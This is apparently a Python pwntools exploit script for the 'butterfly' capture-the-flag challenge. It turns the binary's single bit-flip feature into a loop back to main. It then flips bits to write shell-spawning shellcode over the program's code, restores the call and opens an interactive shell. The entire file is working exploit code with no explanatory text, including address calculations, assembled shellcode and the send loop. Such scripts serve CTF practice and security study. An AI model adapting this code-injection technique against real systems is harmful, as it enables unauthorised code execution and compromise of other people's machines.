
from pwn import *
context(arch = 'amd64', os = 'linux')


# calls (or jumps) we can manipulate to create a loop
#call_addr = int("0x00400845",16)
#call_rel =  int("0xFFFFFDB6",16) # did not work :(
# call mprotect we can manipulate
call_addr = int("0x00400837",16)
call_rel =  int("0xFFFFFE24",16)

# main
a = int("0x400788",16)
b = int("0x4007C8",16)
# _start (this is able to go to main)
c = int("0x400690",16)
d = int("0x4006B4",16)

for bb in range(0,31):
    mask = 1 << bb
    # compute where the call will land
    where = (call_addr + (call_rel^mask) + 5) % 2**32 # plus 5 to skip call rel32
    # check if it is range of returning to main
    if (where >= a and where <= b) or (where >= c and where <= d):
        bh = bb / 8
        bl = bb % 8
        cosmic_ray = (call_addr+1+bh)*(2**3) + bl # plus 1 to skip E8 opcode
        print("cosmic_ray = ", cosmic_ray)

original_cosmic_ray = 33571270
cosmic_rays = []


# original binary in the executable right after our loop
memcode = memcode = bytearray([
  0x85, 0xC0, 0x75, 0x37, 0xBF, 0x56, 0x09, 0x40, 0x00, 0xE8, 
  0xB6, 0xFD, 0xFF, 0xFF, 0x45, 0x31, 0xF6, 0x64, 0x48, 0x8B, 
  0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0x3B, 0x44, 0x24, 
  0x40, 0x75, 0x26, 0x44, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x48, 
  0x5B, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3, 0xBF, 0x42, 0x09, 
  0x40, 0x00, 0xE8, 0xFB, 0xFD, 0xFF, 0xFF, 0xEB, 0xD6, 0xBF, 
  0x4C, 0x09, 0x40, 0x00, 0xE8, 0xEF, 0xFD, 0xFF, 0xFF, 0xEB, 
  0xCA, 0xE8, 0x88, 0xFD, 0xFF, 0xFF, 0x0F, 0x1F, 0x84, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x41, 0x57, 0x41, 0x56, 0x41, 0x89, 
  0xFF, 0x41, 0x55, 0x41, 0x54, 0x4C, 0x8D, 0x25, 0x16, 0x02, 
  0x20, 0x00, 0x55, 0x48, 0x8D, 0x2D, 0x16, 0x02, 0x20, 0x00, 
  0x53, 0x49, 0x89, 0xF6, 0x49, 0x89, 0xD5, 0x31, 0xDB, 0x4C, 
  0x29, 0xE5, 0x48, 0x83, 0xEC, 0x08, 0x48, 0xC1, 0xFD, 0x03, 
  0xE8, 0x0D, 0xFD, 0xFF, 0xFF, 0x48, 0x85, 0xED, 0x74, 0x1E, 
  0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x89, 
  0xEA, 0x4C, 0x89, 0xF6, 0x44, 0x89, 0xFF, 0x41, 0xFF, 0x14, 
  0xDC, 0x48, 0x83, 0xC3, 0x01, 0x48, 0x39, 0xEB, 0x75, 0xEA, 
  0x48, 0x83, 0xC4, 0x08, 0x5B, 0x5D])

# payload
shellcode_str = asm(shellcraft.sh()) + asm("xor rax,rax \n add rsp,0x48 \n pop rbx \n \n pop r14 \n pop r15 \n pop rbp \n ret \n")
#shellcode_str = asm(shellcraft.amd64.linux.sh()) + asm(shellcraft.amd64.infloop()) + asm(shellcraft.amd64.mov('eax', 0)) + asm(shellcraft.amd64.ret())
#shellcode_str = asm("xor rax,rax \n add rsp,0x48 \n pop rbx \n \n pop r14 \n pop r15 \n pop rbp \n ret \n")
shellcode_size = len(shellcode_str)
shellcode = bytearray(shellcode_size)
for i in range(shellcode_size):
	shellcode[i] = ord(shellcode_str[i])

"""
shellcode = bytearray("\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4")
shellcode = bytearray("\xE8\xFF\xFF\xFF\xFF")
shellcode_size = len(shellcode)
"""

# create the loop where we call main repeatedly
# and so flip bits at will for arbritary code execution
cosmic_rays.append(original_cosmic_ray)

# all the flips required to inject the shellcode
flips_required = bytearray(shellcode_size)

call_addr = int("0x00400837",16)
shellcode_start_addr = call_addr + 5


for i in range(shellcode_size):
	a = shellcode[i]
	b = memcode[i]
	flips_required[i] = a ^ b
	for j in range(8):
		if flips_required[i] & (1 << j):
			ray = ((shellcode_start_addr + i)<<3) + j
			cosmic_rays.append(ray)

# restore the original call and execute the shellcode immediately after
cosmic_rays.append(original_cosmic_ray)


# DEBUG
print("start address paylod: " + hex(shellcode_start_addr))
print(len(memcode))
print(len(shellcode))
print(disasm(shellcode_str))
print(len(cosmic_rays))



# ready to pwn

#r = remote('butterfly.pwning.xxx', 9999)
r = process('./butterfly_33e86bcc2f0a21d57970dc6907867bed')

# DEBUG
#gdb.attach(r)   # attach gdb to process # b *0x400827
#print("press start when ready")
#raw_input()  # wait for us setting up gdb breakpoints

i = 0
for ray in cosmic_rays:
	# deus vult
	l = r.recvline()
	print("received: " + l)
	print("sending: " + str(ray))
	print("step: " + str(i))
	# thor it down
	r.sendline(str(ray))
	i += 1

# cat flag
r.interactive()
